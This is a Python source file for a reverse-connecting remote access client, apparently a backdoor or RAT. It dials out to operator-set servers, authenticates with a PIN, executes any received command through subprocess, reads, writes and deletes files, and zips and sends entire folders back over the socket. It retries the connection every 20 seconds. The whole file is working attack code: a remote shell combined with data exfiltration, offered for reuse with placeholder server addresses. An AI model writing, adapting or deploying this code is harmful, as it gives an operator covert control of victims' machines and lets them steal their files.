import socket
import os
import platform
import getpass
import subprocess
import tempfile
import zipfile
import threading
import time
from typing import Tuple
# File transfer sizes adjust if needed!! default is 10GB which is plenty but if you want more adjust it
MAX_TRANSFER_SIZE = 10000 * 1024 * 1024
CHUNK_SIZE = 64 * 1024
# Command handling - add more commands as needed
def handle_command(command: str) -> str:
    command = command.strip()
    try:
        if command == "whoami":
            return getpass.getuser()
        elif command == "hostname":
            return platform.node()
        elif command == "sysinfo":
            return f"OS: {platform.system()} {platform.release()}\nProcessor: {platform.processor()}"
        elif command == "list_processes":
            return subprocess.getoutput("tasklist" if os.name == "nt" else "ps -e")
        elif command in ["ls", "dir"]:
            return "\n".join(os.listdir(os.getcwd()))
        elif command == "pwd":
            return os.getcwd()
        elif command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"Error changing directory: {e}"
        elif command.startswith("read_file "):
            path = command[10:].strip()
            try:
                with open(path, "r", errors="ignore") as f:
                    return f.read()
            except Exception as e:
                return f"Error reading file: {e}"
        elif command.startswith("write_file "):
            try:
                _, path, content = command.split(" ", 2)
                with open(path, "w") as f:
                    f.write(content)
                return f"Wrote to {path}"
            except Exception as e:
                return f"Error writing file: {e}"
        elif command.startswith("delete_file "):
            path = command[12:].strip()
            try:
                os.remove(path)
                return f"Deleted {path}"
            except Exception as e:
                return f"Error deleting file: {e}"
        elif command.startswith("mkdir "):
            try:
                path = command[6:].strip()
                os.mkdir(path)
                return f"Created folder: {path}"
            except Exception as e:
                return f"Error creating folder: {e}"
        elif command == "uptime":
            return subprocess.getoutput("net stats workstation" if os.name == "nt" else "uptime -p")
        else:
            return subprocess.getoutput(command)
    except Exception as e:
        return f"Error: {e}"

def _zip_folder_to_temp(folder_path: str) -> str:
    temp_fd, temp_path = tempfile.mkstemp(suffix=".zip")
    os.close(temp_fd)
    with zipfile.ZipFile(temp_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(folder_path):
            for f in files:
                full = os.path.join(root, f)
                arcname = os.path.relpath(full, start=folder_path)
                zf.write(full, arcname)
    return temp_path

def _file_size_ok(path: str) -> Tuple[bool, int]:
    try:
        size = os.path.getsize(path)
        return (size <= MAX_TRANSFER_SIZE, size)
    except Exception:
        return (False, 0)

def send_file_bytes(sock: socket.socket, original_path: str, file_path_on_disk: str) -> bool:
    is_ok, size = _file_size_ok(file_path_on_disk)
    if not is_ok:
        try:
            sock.sendall(f"FILE_ERROR:size_exceeded:{original_path}\n".encode())
        except: pass
        return False
    header = f"FILE_BEGIN:{original_path}:{size}\n"
    try:
        sock.sendall(header.encode())
        with open(file_path_on_disk, "rb") as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk: break
                sock.sendall(chunk)
        return True
    except Exception as e:
        try:
            sock.sendall(f"FILE_ERROR:send_failed:{original_path}:{e}\n".encode())
        except: pass
        return False

def handle_file_request(sock: socket.socket, path: str):
    path = path.strip()
    if not path:
        sock.sendall(b"FILE_ERROR:empty_path\n")
        return
    if os.path.isfile(path):
        if send_file_bytes(sock, path, path):
            sock.sendall(f"FILE_STATUS:sent:{path}\n".encode())
    elif os.path.isdir(path):
        try:
            zip_path = _zip_folder_to_temp(path)
            if send_file_bytes(sock, zip_path, zip_path):
                sock.sendall(f"FILE_STATUS:sent_zip:{path}\n".encode())
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception as e:
            sock.sendall(f"FILE_ERROR:zip_failed:{path}:{e}\n".encode())
    else:
        sock.sendall(f"FILE_ERROR:not_found:{path}\n".encode())

def start_client(server_ip: str, server_port: int, auth_pin: str):
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # i set the client.settimeout(7) in the connection phase. This is important because if a server is behind a firewall that "drops" packets instead of "rejecting" them, the script could hang for minutes without this limit.
        client.settimeout(7)
        try:
            client.connect((server_ip, server_port))
            client.settimeout(None)
            print(f"[*] Connected to {server_ip}")
            msg = client.recv(1024).decode()
            if msg == "AUTH_REQ":
                client.send(auth_pin.encode())
                auth_reply = client.recv(1024).decode()
                if auth_reply != "AUTH_OK":
                    print(f"[!] Auth failed on {server_ip}")
                    return
                print(f"[+] Authenticated on {server_ip}")
            while True:
                data = client.recv(4096)
                if not data: break
                text = data.decode(errors="ignore")
                for line in text.splitlines():
                    cmd = line.strip()
                    if cmd.startswith("FILE_REQ "):
                        handle_file_request(client, cmd[9:])
                    else:
                        output = handle_command(cmd)
                        client.sendall((output + "\n").encode(errors="ignore"))
        except (socket.timeout, ConnectionRefusedError, OSError):
            print(f"[!] Unconnectable to {server_ip}")
            time.sleep(20)
        except Exception as e:
            print(f"[!] {server_ip} error: {e}")
            break
        finally:
            client.close()
# Auto server connection, add as many servers as you want.
if __name__ == "__main__":
    SERVERS = ["SERVER1", "SERVER2"]
    PORT = "PORT"
    PIN = "PIN"
    threads = []
    for ip in SERVERS:
        t = threading.Thread(target=start_client, args=(ip, PORT, PIN), daemon=True)
        t.start()
        threads.append(t)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Exit.")
